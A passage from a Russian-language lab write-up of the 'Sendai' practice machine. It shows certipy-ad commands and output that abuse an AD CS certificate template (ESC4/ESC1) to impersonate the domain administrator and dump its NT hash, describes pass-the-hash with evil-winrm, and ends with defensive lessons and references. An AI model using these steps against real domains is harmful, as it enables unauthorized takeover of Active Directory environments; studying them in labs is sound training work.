+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">'clifford.davey'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'RFmoB2WplgE_3p'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-target<span class="w"> </span><span class="s1">'dc.sendai.vl'</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">'sendai-DC-CA'</span><span class="w"> </span>-template<span class="w"> </span>SENDAICOMPUTER<span class="w"> </span>-upn<span class="w"> </span><span class="s1">'administrator'</span><span class="w"> </span>-sid<span class="w"> </span><span class="s1">'S-1-5-21-3085872742-570972823-736764132-500'</span>
+<span class="go">Certipy v5.0.4 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Requesting certificate via RPC</span>
+<span class="go">[*] Request ID is 6</span>
+<span class="go">[*] Successfully requested certificate</span>
+<span class="go">[*] Got certificate with UPN 'administrator'</span>
+<span class="go">[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'</span>
+<span class="go">[*] Saving certificate and private key to 'administrator.pfx'</span>
+<span class="go">[*] Wrote certificate and private key to 'administrator.pfx'</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-domain<span class="w"> </span>sendai.vl<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx
+<span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Using principal: administrator@sendai.vl</span>
+<span class="go">[*] Trying to get TGT...</span>
+<span class="go">[*] Got TGT</span>
+<span class="go">[*] Saved credential cache to 'administrator.ccache'</span>
+<span class="go">[*] Trying to retrieve NT hash for 'administrator'</span>
+<span class="go">[*] Got hash for 'administrator@sendai.vl':</span>
+<span class="go">aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</details>
+<p>После получения хэша администратора можем использовать <code>evil-winrm</code> для аутентификации посредством <code>Pass-the-Hash</code>, используя его встроенную опцию <code>-H</code>. После аутентификации находим и забираем второй флаг (<code>root.txt</code>).</p>
+<details class="note">
+<summary>Flag 2 (root.txt)</summary>
+<figure id="__screenshot_11">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_root_flag.webp" data-desc-position="bottom"><img alt="Flag 2 (root.txt)" src="../images/sendai/sendai_root_flag.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 11:</span> Flag 2 (root.txt)</p>
+</figcaption>
+</figure>
+</details>
+<h2 id="_3">Извлеченные уроки<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<ol>
+<li><strong>SMB</strong>. Анонимный доступ к сетевым шарам привел к раскрытию внутреннего документа <code>incident.txt</code>, который стал отправной точкой всей атаки. Именно информация, содержащаяся в нём, натолкнула на мысль использовать распыление пустого пароля для выявления учетных записей с активным флагом <code>STATUS_PASSWORD_MUST_CHANGE</code>. В любом случае, доступ к сетевым шарам должен предоставляться ТОЛЬКО и ТОЛЬКО аутентифицированным пользователям с соблюдением принципа наименьших привилегий.</li>
+<li><strong>Сброс паролей</strong>. Именно из-за массового сброса паролей две обнаруженные учетные записи имели активный флаг <code>STATUS_PASSWORD_MUST_CHANGE</code>, что позволило совершенно легитимно установить собственный пароль через RPC-вызовы без необходимости знания старого пароля. Это говорит о том, что при применении процедуры сброса пароля пароль не должен быть пустым значением. Администраторам следует генерировать сложные временные пароли.</li>
+<li><strong>Чрезмерное делегирование прав</strong>. Именно из-за того, что у рядового пользователя ввиду его членства в группе <code>Support</code> было разрешение <code>ReadGMSAPassword</code> в отношении <code>MGTSVC$</code>, попытка перемещения была успешной. </li>
+<li><strong>Безопасное хранение учетных данных в локальных системах</strong>. Запуск службы <code>helpdesk.exe</code> был сконфигурирован с передачей учетных данных пользователя <code>clifford.davey</code> в открытом виде через аргументы командной строки. Для запуска фоновых служб должны использоваться встроенные учетные записи.</li>
+<li><strong>Защита AD CS</strong>. Группа <code>CA-OPERATORS</code> обладает правами <code>GenericAll</code> в отношении шаблона сертификата <code>SENDAICOMPUTER</code>. Этот факт позволил модифицировать настройки шаблона (ESC4) и выполнить атаку вида ESC1, что в итоге привело к возможности аутентификации на контроллере домена в качестве администратора. Необходимо строго ограничить права на управление шаблонами сертификатов; убрать права вроде <code>GenericAll</code> у всех групп, кроме выделенных <code>Enterprise Admins</code>.</li>
+</ol>
+<h2 id="_4">Источники<a class="headerlink" href="#_4" title="Permanent link">¶</a></h2>
+<ol>
+<li><a href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" target="_blank"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> ADCS ESC4: Vulnerable Certificate Template Access Control от MD Aslam</a></li>
+<li><a href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/" target="_blank"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> AD Certificate Exploitation: ESC1 от MD Aslam</a></li>
+<li><a href="https://www.hackingarticles.in/readgmsapassword-attack/" target="_blank"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> Credential Dumping: GMSA</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html#identify-and-take-over-password-must-change-at-next-logon-accounts-samr" target="_blank"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> Identify and Take Over "Password must change at next logon" Accounts (SAMR) от hacktricks[.]wiki</a></li>
+</ol>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="19 сентября 2026 г. 11:54:40 MSK">19 сентября 2026 г. 11:54:40</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="19 сентября 2026 г. 11:54:40 MSK">19 сентября 2026 г. 11:54:40</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+
+  <h2 id="__comments">Comments</h2>
+
+  <script src="https://giscus.app/client.js" data-repo="bdk44/bdk44.github.io" data-repo-id="R_kgDOUdPNBg" data-category="Announcements" data-category-id="DIC_kwDOUdPNBs4DFytB" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="ru" crossorigin="anonymous" async="">
+  </script>
+
+  <!-- Автоматическая смена темы комментариев при переключении темы сайта -->
+  <script>
+    var giscus = document.querySelector("script[src*='giscus']")
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme)
+    }
+  </script>
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.follow", "header.autohide"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
